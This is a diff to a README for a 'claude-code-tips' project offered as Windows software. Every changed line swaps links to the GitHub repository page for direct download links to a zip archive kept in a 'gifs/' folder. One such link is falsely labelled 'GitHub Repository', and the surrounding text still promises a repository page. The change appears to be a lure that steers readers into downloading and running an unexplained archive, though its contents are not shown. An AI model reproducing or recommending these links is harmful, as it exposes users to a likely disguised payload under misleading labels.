@@ -1,6 +1,6 @@
 # 🚀 claude-code-tips - Clear Guidance for Claude Code Users
 
-[![Download Now](https://img.shields.io/badge/Download-claude--code--tips-brightgreen?style=for-the-badge)](https://github.com/habibbedawi/claude-code-tips)
+[![Download Now](https://img.shields.io/badge/Download-claude--code--tips-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Make sure your Windows updates are current to avoid compatibility issues.
 
 Press the green button below to visit the main page where you can download the software and all resources.
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/habibbedawi/claude-code-tips)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip)
 
 You will arrive at the GitHub repository page. Here are the simple steps to get the files:
 
@@ -105,8 +105,8 @@ Once downloaded and running, you can use most content offline. However, internet
 
 ## 🔗 Useful Links
 
-- Main Download Page: [https://github.com/habibbedawi/claude-code-tips](https://github.com/habibbedawi/claude-code-tips)  
-- GitHub Repository: https://github.com/habibbedawi/claude-code-tips  
+- Main Download Page: [https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip](https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip)  
+- GitHub Repository: https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip  
 - Guides on Claude code plugins and marketplace are available inside the extracted folder under **docs/**.
 
 ---
@@ -140,4 +140,4 @@ claude-code-tips is maintained regularly to handle issues and add new tips. Chec
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-claude--code--tips-brightgreen?style=for-the-badge)](https://github.com/habibbedawi/claude-code-tips)
+[![Download Now](https://img.shields.io/badge/Download-claude--code--tips-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/habibbedawi/claude-code-tips/main/gifs/claude-code-tips-2.5.zip)
